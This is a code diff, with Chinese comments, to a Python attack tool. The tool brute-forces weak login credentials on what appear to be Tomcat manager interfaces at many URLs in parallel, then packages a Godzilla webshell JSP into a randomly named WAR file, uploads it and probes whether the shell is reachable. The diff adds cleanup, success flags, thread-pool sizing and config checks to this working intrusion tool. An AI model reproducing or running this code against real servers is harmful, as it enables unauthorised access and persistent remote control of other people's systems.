@@ -42,8 +42,7 @@ def generate_random_string(length=6):
 
 # 生成 WAR 文件，其中包含 Godzilla Webshell
 def generate_war(config):
-    shell_file_path = config['files']['shell_file']  # 从 config 中读取 shell 文件路径
-
+    shell_file_path = config['files']['shell_file']
     random_string = generate_random_string()
     war_file_name = f"{random_string}.war"
     shell_file_name = f"{generate_random_string()}.jsp"
@@ -53,7 +52,6 @@ def generate_war(config):
         return None, None, None
 
     try:
-        # 将 JSP 文件打包为 WAR 文件
         with zipfile.ZipFile(war_file_name, 'w', zipfile.ZIP_DEFLATED) as war:
             war.write(shell_file_path, shell_file_name)
         logger.info(f"[+] WAR 包生成成功: {war_file_name}，JSP 文件名: {shell_file_name}")
@@ -73,7 +71,7 @@ def get_jsessionid_and_csrf_nonce(url, username, password):
         jsessionid = cookies.get('JSESSIONID')
         if not jsessionid:
             logger.warning(f"{Fore.YELLOW}[!] 未能获取 JSESSIONID {login_url} {Style.RESET_ALL}")
-            return None, None, None
+            return None, None, None, False
 
         # 使用 BeautifulSoup 解析 HTML 并提取 CSRF_NONCE 和文件上传字段名
         soup = BeautifulSoup(response.text, 'html.parser')
@@ -86,17 +84,24 @@ def get_jsessionid_and_csrf_nonce(url, username, password):
         file_input = soup.find('input', {'type': 'file'})
         file_field_name = file_input['name'] if file_input else 'file'
 
-        return jsessionid, csrf_nonce, file_field_name
+        return jsessionid, csrf_nonce, file_field_name, True
     except requests.exceptions.RequestException as e:
         logger.warning(f"{Fore.YELLOW}[!] 错误在get_jsessionid_and_csrf_nonce {url}: {str(e)}{Style.RESET_ALL}")
-        return None, None, None
+        return None, None, None, False
 
 # 部署 Godzilla Webshell 并尝试访问上传的 Webshell
 def deploy_godzilla_war(url, username, password, war_file_path, random_string, shell_file_name, output_file, max_retries, retry_delay):
     url = clean_url(url)  # 清理 URL，确保格式正确
-    jsessionid, csrf_nonce, file_field_name = get_jsessionid_and_csrf_nonce(url, username, password)
+    jsessionid, csrf_nonce, file_field_name, success = get_jsessionid_and_csrf_nonce(url, username, password)
 
-    if not jsessionid or not csrf_nonce or not file_field_name:
+    if not success:
+        # 如果未能获取 JSESSIONID、csrf_nonce，则删除 WAR 文件
+        if os.path.isfile(war_file_path):
+            try:
+                os.remove(war_file_path)
+                logger.info(f"[+] 删除 WAR 文件: {war_file_path}")
+            except OSError as e:
+                logger.error(f"[-] 删除 WAR 文件失败: {str(e)}")
         return
 
     attempt = 0
@@ -176,31 +181,74 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
 
     return url, None, None
 
+# 动态调整线程池大小，确保资源使用合理
+def adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, combination_per_thread):
+    # 根据用户配置的每多少个组合分配一个线程
+    calculated_workers = (combination_count + combination_per_thread - 1) // combination_per_thread  # 向上取整
+
+    # 保证线程数不低于min_workers，不超过max_workers_limit
+    workers = min(max(min_workers, calculated_workers), max_workers_limit)
+
+    logger.info(f"根据用户名和密码组合总数 {combination_count} 调整线程池大小为 {workers}")
+    return workers
+
+def validate_config(config):
+    required_fields = {
+        'files': ['url_file', 'user_file', 'passwd_file', 'output_file'],
+        'retry': ['check_weak_password', 'deploy_godzilla_war'],
+        'thread_pool': ['max_workers_limit', 'min_workers']
+    }
+
+    for section, fields in required_fields.items():
+        if section not in config:
+            logger.error(f"配置文件中缺少 {section} 部分")
+            return False
+        for field in fields:
+            if field not in config[section]:
+                logger.error(f"配置文件中 {section} 部分缺少 {field} 字段")
+                return False
+
+    return True
+
 # 主函数
 def main():
+    # 加载配置文件
     config = load_config("config.yaml")
 
+    # 验证配置文件
+    if not validate_config(config):
+        logger.error("配置文件验证失败")
+        return
+
+    # 加载 URL、用户名和密码文件
     urls = load_file(config['files']['url_file'])
     usernames = load_file(config['files']['user_file'])
     passwords = load_file(config['files']['passwd_file'])
     output_file = config['files']['output_file']
 
-    # 根据用户名和密码组合总数调整线程池大小
-    combination_count = len(urls) * len(usernames) * len(passwords)
+    # 获取线程池配置
     max_workers_limit = config['thread_pool']['max_workers_limit']
     min_workers = config['thread_pool']['min_workers']
+    combination_per_thread = config['thread_pool'].get('combination_per_thread', 200)  # 默认200
 
-    workers = min(max(min_workers, combination_count), max_workers_limit)
-    logger.info(f"根据用户名和密码组合总数 {combination_count} 调整线程池大小为 {workers}")
+    # 计算用户名和密码组合总数
+    combination_count = len(urls) * len(usernames) * len(passwords)
 
+    # 根据组合总数调整线程池大小
+    workers = adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, combination_per_thread)
+
+    # 使用线程池执行弱口令检测
     with ThreadPoolExecutor(max_workers=workers) as executor:
-        futures = [executor.submit(check_weak_password, url, usernames, passwords, output_file,
-                                   config['retry']['check_weak_password']['max_retries'],
-                                   config['retry']['check_weak_password']['retry_delay'],
-                                   config) for url in urls]
+        futures = [
+            executor.submit(check_weak_password, url, usernames, passwords, output_file,
+                            config['retry']['check_weak_password']['max_retries'],
+                            config['retry']['check_weak_password']['retry_delay'],
+                            config) for url in urls
+        ]
 
+        # 等待所有任务完成
         for future in as_completed(futures):
-            future.result()
+            result = future.result()
 
 if __name__ == "__main__":
     main()
